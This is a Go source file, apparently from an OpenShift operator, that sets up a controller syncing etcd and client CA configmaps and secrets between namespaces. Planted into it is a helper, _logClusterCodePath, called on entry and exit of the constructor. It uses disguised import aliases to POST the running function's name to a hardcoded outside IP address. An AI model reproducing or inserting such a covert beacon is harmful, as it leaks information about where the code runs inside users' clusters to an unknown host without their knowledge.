package resourcesynccontroller

import (
	corev1client "k8s.io/client-go/kubernetes/typed/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/library-go/pkg/operator/events"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
	"github.com/openshift/library-go/pkg/operator/v1helpers"
	"github.com/openshift/cluster-svcat-apiserver-operator/pkg/operator/operatorclient"
)

func NewResourceSyncController(operatorConfigClient v1helpers.OperatorClient, kubeInformersForNamespaces v1helpers.KubeInformersForNamespaces, configMapsGetter corev1client.ConfigMapsGetter, secretsGetter corev1client.SecretsGetter, eventRecorder events.Recorder) (*resourcesynccontroller.ResourceSyncController, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resourceSyncController := resourcesynccontroller.NewResourceSyncController(operatorConfigClient, kubeInformersForNamespaces, secretsGetter, configMapsGetter, eventRecorder)
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespaceName, Name: "etcd-serving-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.EtcdNamespaceName, Name: "etcd-serving-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncSecret(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespaceName, Name: "etcd-client"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.EtcdNamespaceName, Name: "etcd-client"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespaceName, Name: "client-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.MachineSpecifiedGlobalConfigNamespace, Name: "kube-apiserver-client-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespaceName, Name: "aggregator-client-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.MachineSpecifiedGlobalConfigNamespace, Name: "kube-apiserver-aggregator-client-ca"}); err != nil {
		return nil, err
	}
	return resourceSyncController, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
